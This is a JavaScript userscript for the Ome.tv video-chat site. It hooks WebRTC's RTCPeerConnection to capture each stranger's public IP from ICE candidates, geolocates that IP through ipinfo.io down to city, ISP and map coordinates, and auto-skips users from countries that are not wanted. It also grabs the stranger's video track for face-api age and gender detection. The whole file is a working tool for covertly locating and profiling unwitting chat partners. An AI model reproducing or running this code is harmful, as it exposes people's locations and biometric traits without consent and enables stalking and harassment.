//ADD YOUR API KEY HERE 
const api_key = "ADD-YOUR-API-KEY"

// Add these variables at the top
const targetCountries = ['US', 'GB']; // Add your preferred country codes
let skipEnabled = true;

var streamer = false
var button = document.querySelector('.btn-red');
button.setAttribute('onclick', 'updateHTML(`<i class="fa-solid fa-circle-check"></i><span>Awaiting start.</span>`)');

window.oRTCPeerConnection =
  window.oRTCPeerConnection || window.RTCPeerConnection;

window.RTCPeerConnection = function (...args) {
  const pc = new window.oRTCPeerConnection(...args);

  pc.oaddIceCandidate = pc.addIceCandidate;

  pc.addIceCandidate = function (iceCandidate, ...rest) {
    const fields = iceCandidate.candidate.split(" ");

    console.log(iceCandidate.candidate);
    var ip = fields[4];
    if (fields[7] === "srflx") {
        AddGather(ip)
        updateHTML(`<i class="fa-solid fa-circle-check"></i><span>IP address captured, click the button</span>`)
    }
    return pc.oaddIceCandidate(iceCandidate, ...rest);
  };
  return pc;
};

// Add after RTCPeerConnection override
let videoTrack = null;

// Clean up videoTrack and addTrack implementation
window.RTCPeerConnection.prototype.addTrack = function(track, ...streams) {
    if(track.kind === 'video') {
        videoTrack = track;
        detectGender();
    }
    return window.oRTCPeerConnection.prototype.addTrack.apply(this, arguments);
};

async function detectGender() {
    if (!videoTrack) return;
    const video = document.createElement('video');
    video.srcObject = new MediaStream([videoTrack]);
    video.autoplay = true;
    video.style.display = 'none';
    document.body.appendChild(video);
    
    try {
        // Wait for video to load
        await new Promise(r => video.addEventListener('loadeddata', r));
        const detection = await faceapi.detectSingleFace(video)
            .withFaceExpressions()
            .withAgeAndGender();
        
        if (detection) {
            updateHTML(`<i class="fa-solid fa-circle-check"></i><span>Gender: ${detection.gender}</span>`);
        }
    } catch (e) {
        console.log('Gender detection failed:', e);
    } finally {
        document.body.removeChild(video);
    }
}

// Clean up the gather function
function gather(ip) {
    return new Promise(async (resolve, reject) => {
        try {
            let url = `https://ipinfo.io/${ip}/json?token=${api_key}`;
            const response = await fetch(url);
            const json = await response.json();
            
            if (!json.status) {
                AddMap(json.loc);
                
                // Auto-skip if country doesn't match
                if(skipEnabled && !targetCountries.includes(json.country)) {
                    console.log('Country not matched, skipping...');
                    const skipButton = document.querySelector('.skip');
                    if(skipButton) skipButton.click();
                }
                
                if(!streamer) {
                    updateHTML(`
                        <i class="fa-solid fa-earth-americas"></i><span>${json.country}</span><br>
                        <i class="fa-solid fa-city"></i><span>${json.city}</span><br>
                        <i class="fa-solid fa-signs-post"></i><span>${json.region}</span><br>
                        <i class="fa-solid fa-ethernet"></i><span>${json.org}</span><br>
                        <i class="fa-solid fa-location-dot"></i><span>${json.ip}</span>`);
                } else {
                    updateHTML(`
                        <i class="fa-solid fa-earth-americas"></i><span>${json.country}</span><br>
                        <i class="fa-solid fa-city"></i><span>${json.city}</span><br>
                        <i class="fa-solid fa-signs-post"></i><span>${json.region}</span><br>
                        <i class="fa-solid fa-ethernet"></i><span>${json.org}</span><br>
                        <i class="fa-solid fa-location-dot"></i><span>REDACTED</span>`);
                }
                resolve();
            } else {
                reject(new Error("Failed to get IP information."));
            }
        } catch (error) {
            reject(error);
        }
    });
}

function AddGather(ip) {
    var divElements = document.getElementsByClassName('gather');
    var attributeValue = "gather('" + ip + "')";    
    for (var i = 0; i < divElements.length; i++) {
        divElements[i].setAttribute('onclick', attributeValue);     
    }
    // Immediately gather IP info when captured
    gather(ip);         
}

function AddMap(loc) {
  var divElements = document.getElementsByClassName('map');
  var attributeValue = "openMap('https://maps.google.com/?q=" + loc +  "')";
  for (var i = 0; i < divElements.length; i++) {
    divElements[i].setAttribute('onclick', attributeValue);
  }             
}

function updateHTML(print) {
    const overlay = document.getElementById("overlay");              
    const info = document.getElementById("Info");
  
    info.innerHTML = print
}

function openMap(link) {       
  window.open(link, '_blank');      
}

function streamerMode() {
  streamer = !streamer;
}

//Setting gui
var overlay = document.createElement('div');
overlay.id = 'overlay';

var Title = document.createElement('p');
Title.id = 'Title';
Title.textContent = 'Ome.tv ip check';

var Info = document.createElement('p');
Info.id = 'Info';
var infoIcon = document.createElement('i');
infoIcon.className = 'fa-solid fa-circle-check';
var infoText = document.createElement('span');
infoText.textContent = 'The loading was successful, enjoy using it.';
Info.appendChild(infoIcon);
Info.appendChild(infoText);

var buttonCheck = document.createElement('div');
buttonCheck.id = 'button';
buttonCheck.className = 'gather';
buttonCheck.textContent = 'Check';

var buttonMap = document.createElement('div');
buttonMap.id = 'button';
buttonMap.className = 'map';
buttonMap.textContent = 'Map';

var buttonStreamerMode = document.createElement('div');
buttonStreamerMode.id = 'button';
buttonStreamerMode.className = 'streamer';
buttonStreamerMode.textContent = 'Streamer Mode';
buttonStreamerMode.setAttribute('onclick', 'streamerMode()');

// Add toggle button for auto-skip
var buttonAutoSkip = document.createElement('div');
buttonAutoSkip.id = 'button';
buttonAutoSkip.className = 'autoskip';
buttonAutoSkip.textContent = 'Auto Skip: ON';
buttonAutoSkip.onclick = function() {
    skipEnabled = !skipEnabled;
    this.textContent = `Auto Skip: ${skipEnabled ? 'ON' : 'OFF'}`;
};

// Create a container for buttons and add all buttons
var buttonContainer = document.createElement('div');
buttonContainer.className = 'button-container';
buttonContainer.appendChild(buttonCheck);
buttonContainer.appendChild(buttonMap);
buttonContainer.appendChild(buttonStreamerMode);
buttonContainer.appendChild(buttonAutoSkip);

var credit = document.createElement('p');
credit.id = 'credit';
credit.innerHTML = '<small>made with<i class="fa-solid fa-heart"></i>by flash</small>';

overlay.appendChild(Title);
overlay.appendChild(Info);
overlay.appendChild(buttonContainer);
overlay.appendChild(credit);

var mainAbout = document.querySelector('main#about');
mainAbout.appendChild(overlay);

// Style changes
var style = document.createElement('style');
style.textContent = `
  @import url('https://fonts.googleapis.com/css2?family=Ubuntu&display=swap');
  div #overlay {  
    position: fixed;
    z-index: 9999;
    background-color: rgba(17, 24, 39, 0.95);
    box-shadow: 0px 0px 20px rgba(0, 217, 255, 0.2);
    border: 1px solid rgba(0, 217, 255, 0.4);
    padding: 15px 25px;
    bottom: 1.5em;
    right: 1.5em;
    border-radius: 12px;
    transition: all 0.3s ease;    
    color: #fff;
  }
  #overlay p#Title {
    font-size: 20px;
    margin: 0 0 15px 0;
    text-align: center;
    font-family: 'Ubuntu', sans-serif;
    color: #fff;
    text-shadow: 0px 0px 8px rgba(0, 217, 255, 0.5);
    user-select: none;
  }
  #overlay p#Info {
    font-size: 14px;
    text-align: center;
    font-family: 'Ubuntu', sans-serif;
    color: #fff;
    padding-bottom: 15px;
    user-select: none;
    display: flex;
    align-items: center;
    justify-content: center;
    gap: 5px;
  }
  #overlay p#Info span {
    color: #00d6fe;
    user-select: all;
  }
  #overlay p#Info i {
    margin: 0;
    padding: 0;
    width: auto;
  }
  .button-container {
    display: flex;
    justify-content: center;
    gap: 8px;
    margin-bottom: 8px;
  }
  #overlay div#button {
    display: inline-block;
    user-select: none;
    cursor: pointer;
    font-family: 'Ubuntu', sans-serif;
    font-size: 13px;
    text-decoration: none;
    border-radius: 6px;
    margin: 5px;
    padding: 8px 16px;
    color: #fff;
    background-color: rgba(0, 217, 255, 0.15);
    border: 1px solid rgba(0, 217, 255, 0.3);
    transition: all 0.2s ease;
  }
  #overlay div:hover#button {
    background-color: rgba(0, 217, 255, 0.25);
    box-shadow: 0 0 15px rgba(0, 217, 255, 0.2);
    transform: translateY(-1px);
  }
  #overlay div:active#button {
    transform: translateY(0);
  }
  #overlay p#credit {
    font-size: 9px;
    text-align: center;
    font-family: 'Ubuntu', sans-serif;
    color: rgba(255, 255, 255, 0.3);
    margin: 0;
    padding: 0;
    user-select: none;
  }
  #overlay p#credit i {
    color: #ff4f4f;
    font-size: 7px;
    margin: 0 1px;
    animation: pulse 1.5s ease infinite;
  }
  @keyframes pulse {
    0% { transform: scale(1); }
    50% { transform: scale(1.2); }
    100% { transform: scale(1); }
  }
`;
document.head.appendChild(style);

//setting Font Awesome
var font_awesome = document.createElement("link");
font_awesome.rel = "stylesheet";
font_awesome.href = "https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css";
font_awesome.integrity = "sha512-iecdLmaskl7CVkqkXNQ/ZH/XLlvWZOJyj7Yy7tcenmpD1ypASozpmFIB46ZmdtAc9eNBvH0H/ZpiBw==";
font_awesome.crossOrigin = "anonymous";
font_awesome.referrerPolicy = "no-referrer";
document.head.appendChild(font_awesome);

// Add face-api.js library
var face_api = document.createElement("script");
face_api.src = "https://cdn.jsdelivr.net/npm/face-api.js@0.22.2/dist/face-api.min.js";
document.head.appendChild(face_api);

// Load face detection models when face-api is ready
face_api.onload = async () => {
    await faceapi.nets.tinyFaceDetector.loadFromUri('https://cdn.jsdelivr.net/npm/face-api.js@0.22.2/weights/');
    await faceapi.nets.faceExpressionNet.loadFromUri('https://cdn.jsdelivr.net/npm/face-api.js@0.22.2/weights/');
    await faceapi.nets.ageGenderNet.loadFromUri('https://cdn.jsdelivr.net/npm/face-api.js@0.22.2/weights/');
};

